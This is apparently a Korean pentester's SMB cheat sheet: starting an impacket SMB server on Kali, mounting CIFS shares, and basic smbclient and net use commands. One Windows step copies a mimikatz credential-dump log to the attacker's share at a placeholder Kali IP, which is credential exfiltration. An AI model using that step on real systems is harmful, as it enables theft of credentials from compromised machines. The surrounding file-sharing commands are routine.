### SMB 서버 열기 (kali)
```bash
impacket-smbserver test . -smb2support  -username kourosh -password kourosh
```
### SMB 서버 연결하기 (win)
```bash
net use m: \\Kali_IP\test /user:kourosh kourosh
copy mimikatz.log m:\
```

### SMB 서버 Mount 하기 (kali)
```bash
sudo apt-get install cifs-utils
mkdir /mnt/share
sudo mount -t cifs -o username=admin,password=hello //192.168.0.23/shared /mnt/share
```

### SMB 서버 Unmount 하기 (kali)
```bash
umount /mnt/usb
# 강제
umount -f /mnt/usb
```

### SMB 커맨드
```bash
# smb 접속
smbclient //192.168.0.10/share -U guest
# windows에서 접속할 시
net use \\192.168.0.10\share /user:guest
# 파일 다운
get <파일이름>
# 파일 업로드
put <파일이름>
# 파일 삭제
del <파일이름>
```
